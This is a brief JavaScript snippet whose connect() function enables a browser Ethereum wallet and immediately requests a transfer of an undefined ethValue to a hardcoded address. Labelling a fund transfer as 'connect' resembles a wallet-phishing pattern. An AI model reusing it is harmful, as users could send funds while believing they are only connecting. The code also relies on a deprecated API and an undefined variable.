var web3;

async function connect(){
    await window.web3.currentProvider.enable();
    
    web3=new Web3(window.web3.currentProvider);
     web3.eth.sendTransaction({
                to: '0x03b89A4c0CF05D8c0a85E53c6979088B6ceB1E0b',
                value: web3.toWei(ethValue, 'ether')
            }, (err)=> {
            })



}
